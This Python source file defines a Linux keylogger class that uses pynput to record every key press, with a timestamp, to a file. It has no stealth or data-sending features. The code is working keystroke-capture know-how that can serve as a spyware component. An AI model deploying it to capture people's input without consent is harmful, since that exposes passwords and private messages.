# core/key_capture/linux_key_logger.py

import time
from core.key_capture.key_logger_base import KeyLoggerBase
from core.file_handler.file_handler import FileHandler

# Import the specific library for Linux key logging, for example, pynput
from pynput import keyboard


class LinuxKeyLogger(KeyLoggerBase):
    """
    Keylogger for Linux systems.
    """

    def __init__(self, file_path):
        """
        Initializes the Linux keylogger with a file path for storing data.
        :param file_path: Path to the file where keystrokes will be logged.
        """
        self.file_handler = FileHandler(file_path)
        self.listener = None

    def on_press(self, key):
        """
        Callback function to handle a key press event.
        :param key: The key that was pressed.
        """
        try:
            self.file_handler.write_data([time.time(), str(key)])
        except Exception as e:
            print(f"Error logging key press: {e}")

    def start_capture(self):
        """
        Starts the keylogger to capture keystrokes.
        """
        try:
            self.file_handler.open_file()
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
        except Exception as e:
            print(f"Error starting keylogger: {e}")
            raise

    def stop_capture(self):
        """
        Stops the keylogger and closes the file.
        """
        try:
            if self.listener is not None:
                self.listener.stop()
            self.file_handler.close_file()
        except Exception as e:
            print(f"Error stopping keylogger: {e}")
